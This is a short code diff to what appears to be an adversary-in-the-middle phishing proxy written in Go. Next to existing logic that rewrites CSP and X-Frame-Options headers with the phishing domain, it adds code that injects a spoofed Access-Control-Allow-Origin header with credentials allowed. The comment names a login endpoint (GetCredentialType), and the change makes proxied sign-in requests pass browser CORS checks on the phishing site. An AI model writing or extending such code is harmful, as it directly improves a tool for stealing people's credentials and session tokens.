@@ -1107,6 +1107,16 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
             trigger := 0
 
             p.replaceHeaderWithPhished(resp, "Access-Control-Allow-Origin")
+            // If the upstream response has no ACAO header (common for same-origin API
+            // endpoints like GetCredentialType) but the request has an Origin header,
+            // inject ACAO so the browser's CORS check passes for cross-origin XHR.
+            if resp.Header.Get("Access-Control-Allow-Origin") == "" {
+                if origin := resp.Request.Header.Get("Origin"); origin != "" {
+                    phishedOrigin := p.replaceStringWithPhished(origin)
+                    resp.Header.Set("Access-Control-Allow-Origin", phishedOrigin)
+                    resp.Header.Set("Access-Control-Allow-Credentials", "true")
+                }
+            }
             p.replaceHeaderWithPhished(resp, "Content-Security-Policy")
             p.replaceHeaderWithPhished(resp, "Content-Security-Policy-Report-Only")
             p.replaceHeaderWithPhished(resp, "X-Frame-Options")
